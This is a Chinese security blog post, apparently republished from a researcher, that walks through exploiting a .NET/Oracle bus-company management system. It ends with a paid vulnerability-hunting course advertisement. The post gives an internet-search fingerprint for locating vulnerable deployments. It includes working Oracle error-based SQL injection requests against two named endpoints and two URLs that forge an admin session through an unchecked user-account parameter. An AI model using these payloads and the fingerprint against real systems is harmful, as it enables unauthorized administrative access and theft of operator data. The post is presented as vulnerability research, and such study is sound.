---
title: 实战复现：公交系统未授权登录 + SQL 注入漏洞利用全解
url: https://mp.weixin.qq.com/s/oVkRDMGS7gR9ZazQQ88Nlw
source: Doonsec's feed
date: 2026-05-04
fetch_date: 2026-05-05T05:01:37.631936
---

# 实战复现：公交系统未授权登录 + SQL 注入漏洞利用全解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QWlGuqN3iajhbmXNHdvZIFFv3FnqseVMcSprfSKa547z1icOykU6icAOaiamJzyickq88FyNW36juibSRkTic2LkBE2aicOMLicQaiaXrqick/0?wx_fmt=jpeg)

# 实战复现：公交系统未授权登录 + SQL 注入漏洞利用全解

Payload
Payload

神农Sec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

课程培训

扫码咨询

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic)

#

专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。

#

文章作者：Payload

文章来源：http://xz.aliyun.com/news/17321

01

0x1 实战复现：公交系统未授权登录 + SQL 注入漏洞利用全解

## 1.漏洞介绍

本次分析针对某系统（基于 .NET + Oracle 架构）中存在的严重安全缺陷，主要涵盖**身份认证绕过**与**SQL注入**漏洞。

1. **登录绕过漏洞（身份伪造）**： 系统在多处关键接口（如后台管理入口）存在严重的逻辑缺陷。攻击者无需知晓真实密码，仅需构造特定的请求（利用 SetAuthCookie 机制或特定的参数篡改），即可直接伪造任意已存在管理员用户的身份标识（Identity）。成功利用后，攻击者可绕过登录验证界面，直接获取系统最高权限，导致整个后台管理系统完全失控。
2. **SQL 注入漏洞（数据泄露与执行）**： 系统在多个业务模块（如培训管理、课程安排等）的参数处理上缺乏严格过滤。用户输入的 itemid 等参数被直接拼接至 Oracle 数据库查询语句中。攻击者可通过构造恶意 Payload（如利用 dbms\_xdb\_version.checkin 等函数进行报错注入），不仅可窃取数据库中的敏感信息（如管理员账号、哈希密码、业务数据），在特定条件下甚至可能实现数据库层面的命令执行，对服务器安全构成极大威胁。

影响版本：

> "version":"7.0.0.0.R3"

指纹：

```
body="HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"||body="var _FactoryData"
```

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXicTrQIZbXBcCfyrgAqCib66wuibPU5JiczIsiafLAC5WwmAGPN6tTysJjwGic5cxxc91BhP8T3aKvgCtlY7Lia1g81QBrIgEDCwTQgY/640?wx_fmt=png&from=appmsg)

## 2.漏洞分析

### 2.1注入漏洞

#### 2.1.1第一处SQL注入漏洞

**打开源码**YZSoftFormsXFormHRTrainOnlineArrangeCourse\_Mng.aspx.cs

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUQhUaibvZsX7Oj823n6uXTWIlq1tCZ2mpcwH0OjhSPj1U9RlmIGMDpe81RUZ5gBPSpsDREicvKGHxrIx2IVub9X1Soq8LicTrbbY/640?wx_fmt=png&from=appmsg)

漏洞分析：变量 itemid 直接来自用户输入（Request.Params["itemid"]），并且没有经过任何过滤，就直接拼接到了 SQL 查询字符串中。

**复现步骤：**

1. 发送以下 Payload 进行报错注入测试：

```
POST /YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse_Mng.aspx?relationid=1 HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
User-Agent:

itemid=1'
```

成功获取user的值：

http://127.0.0.1/YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse\_Mng.aspx?itemid=-1%27||dbms\_xdb\_version.checkin(user)||%27

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWWYJKfoycjsNzXDwX9CXMSDzbvzuSmUhE6k2mPVhJL6q5DWfiaob8Vn1blBljic1aibvnG116z6lqH1BkeFkEvxw7nBOFncwBnsk/640?wx_fmt=png&from=appmsg)

#### 2.1.2第二处注入漏洞

漏洞文件在WEBYZSoftFormsXFormBMMaintainManagementKSAddMaintainReport.aspx.cs

**漏洞分析：**接收前端传入的 tid 和 key 参数，其中 key 参数的值被直接赋值给变量 strWorkreportno。随后，该变量未经任何过滤或参数化处理，直接通过 string.Format 拼接到 SQL 查询语句中，从而引发 SQL 注入漏洞。

**复现步骤：**

```
GET /YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx?tid=&key=-1' HTTP/1.1
Host: 127.0.0.1
```

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUcnD8tB2HuhOJv2FMJnrHHia8MXALbHqDAHu4mlPQx4dloe6Ady5xwqI5axopAL8hQzRgeH6TJehRDHnhzhGPibQvuibG62JMI50/640?wx_fmt=png&from=appmsg)

```
GET /YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx?tid=&key=-1%27||dbms_xdb_version.checkin(user)||%27 HTTP/1.1
Host:
```

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVYYPw5m2IdtNlrAvk5WL7sEibcGA5xwcXUDibFYjavTlwIJSOibUIz4lCHLujiaQU7WXAIrKwlDia027YhBBQeDb7yZkaPKWt3xC84/640?wx_fmt=png&from=appmsg)

### 2.2登录绕过漏洞

#### 2.2.1第一处登录绕过

漏洞文件： WEBHisModulesOMPlanHandlerServiceArrange\_Query.ashx

```
{
    public class Arrange_Query : IHttpHandler, IRequiresSessionState
    {

        public void ProcessRequest(HttpContext context)
        {

            string action = ComFunction.GetRequestStr("action");
            string UserAccount = ComFunction.GetRequestStr("useraccount");
            if (!string.IsNullOrEmpty(UserAccount))
            {
                YZAuthHelper.SetAuthCookie(UserAccount);
                YZAuthHelper.ClearLogoutFlag();
            }
            YZAuthHelper.AshxAuthCheck();
            YZDebugHelper.Init();

            switch (action)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QV1AHlObP34ZJlXA1YVyXv4WTkCGicrSV0p3ibReraDt0ErkHRbsrNr3QPaJicjchiatSicRQBwFu46GsAicUq2A2QIKLGrRrnG82SFk/640?wx_fmt=png&from=appmsg)

漏洞分析：先通过useraccount参数设置用户身份 → 再做权限检查，相当于攻击者可以通过传入任意useraccount值，直接冒充该用户身份，完全绕过权限验证。

```
http://127.0.0.1/HisModules/OM/Plan/HandlerService/Arrange_Query.ashx?useraccount=admin
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUZWQsyWBQcLIp6YPiaQe0yRcINvNOm1XXurDEZAwCa8n02lb0NbibicVqR2ibxs9bUtJpSwkYy5PgBKQ2icMzsnjPNrKZ6BvcJNkQU/640?wx_fmt=png&from=appmsg)

在访问根路径，即可进入后台：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXGVZ0z7zVUmXjOl7bHFIWyXvWaWH8JFdIvuicsSTGGeAC7Q6X8AFYrWKsNic7aysbuUpIAXcy8k6pKuN7qTicYrNageozxDoPb00/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXWicr7sic8joMBhicQRT5dHUicuAe369Q9QNSiaHuERibf0CIGjshiaGV3PYiacQJib3yG5t1N1ZMmWtdib8o1Q2e6UoCuBeDgqWwUJJgUQ/640?wx_fmt=png&from=appmsg)

*解释：(此处必须要系统里面存在的用户名才能登录绕过，默认伪造admin用户)*

1. 请求携带 useraccount=admin。
2. 服务器执行 SetAuthCookie("admin")，当前请求身份变为 admin。
3. 执行 GetPeiChePaiBanInfoList，返回的数据将是 admin 权限下的敏感数据。

#### 2.2.2 第二处登录绕过漏洞

打开源码 WEBWebServiceerpapi.asmx，后端逻辑指向/App\_Code/ERPAPI.cs文件

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVqo4JAwnySdzx6tswEc5LZuFquiaMBv8tbJju9du4JTmzK5js3ocLUF5B37D7OhVwnOn9QgWDAvYWFCRxIHkpT1OiaUaFzPP8qE/640?wx_fmt=png&from=appmsg)

打开/App\_Code/ERPAPI.cs，定位到query\_getworkordertypelist方法。

![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXQeWulTiayZ276fnXSicJSyiaYmic6d4FFmeARMWy9ObzNBSNOXCYtr5OiaqtHM8rDFt8Zx1tNJe3BhUibibC3r1BzWLAXmbSYbfdUtE/640?wx_fmt=png&from=appmsg)

代码如下

```
 public void query_getworkordertypelist(string paraList)
    {
        try
        {
            JObject jobject = BaseFuction.ParseParaString(paraList);
            string UserAccount = (string)jobject["UserAccount"];
            if (!string.IsNullOrEmpty(UserAccount))
            {
                YZAuthHelper.SetAuthCookie(UserAccount);
                YZAuthHelper.ClearLogoutFlag();
            }
            object[] obj = new object[1];
            obj[0] = paraList;
            string msg = GetCommand("Query_GetWorkOrderTypeList@", obj) as String;
            Context.Response.Clear();
            Context.Response.ContentType = "application/json; charset = UTF-8";
            Context.Response.Write(msg);
            Context.Response.Flush();
            Context.Response.End();
        }
        catch (Exception e)
        {
            // return BaseFuction.ParseResultString(false, "提交出错:" + e.Message, null);
        }
    }
```

漏洞分析：接口接收 JSON 参数中的UserAccount字段，未做任何身份验证校验，直接调用SetAuthCookie(UserAccount)设置当前请求身份，攻击者只需传入系统中存在的用户名（如 admin），即可冒充该用户执行Query\_GetWorkOrderTypeList逻辑，

**复现步骤：**

http://127.0.0.1/webservice/ERPAPI.asmx/query\_getworkordertypelist?paraList={%22UserAccount%22:%22admin%22}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWJxvzsXf8yHNXhnVRLQCASMiaqlolUMcIIkOHabXmdIiaz53IkN57lvsQwwMhHGkibbicXloaTC7ID4UBfaUrBNYWozGJfibNY7AZ4/640?wx_fmt=png&from=appmsg)

在访问根路径，即可进入后台：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVfXYf5FRZ7EFb8icT3jriccPUWgqEaGcRQbTIZLZeP6fRY22whFu539ia72cVstoPaRkhXxLHTNKjwBn1FFnUFK23mxsLdbnfV90/640?wx_fmt=png&from=appmsg)

02

0x2 培训课程介绍

26

**SRC漏洞挖掘培训课程**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/6cIuvSQkkicOHhYFkQLTibYAMUR9rfZ9eUrI78toIC4V2304G909O6s6CnVrAGiaYLEJM9XuUARhzNfxCtYKQfQ83wfPSlqpshSScfoYzSKzgY/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&watermark=1&tp=wxpic#imgIndex=4)

**1.课程价格目前是475（后面也会随着人数越多，涨价）🌟师傅们还可以上车补票，冲冲冲！**

**2.报名成功送知识星球一个，拉内部小圈子交流群+SRC直播通知群！✨**

**3.一周2节课程，直播+录播形式，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课！❤️**

**4.目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的！**

**5.上课结束后，会把视频录播+课件笔记一起打包发直播群！**

**6.哔哩哔哩SRC课程公开课，链接🔗直达：**

**https://space.bilibili.com/642258933**

SRC课程详情🔎：[神农SRC 漏洞挖掘实战课：从 0 到 1 成](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247505805&idx=1&sn=d3bb65bef6d6021bb923516b585abc06&scene=21#wecha...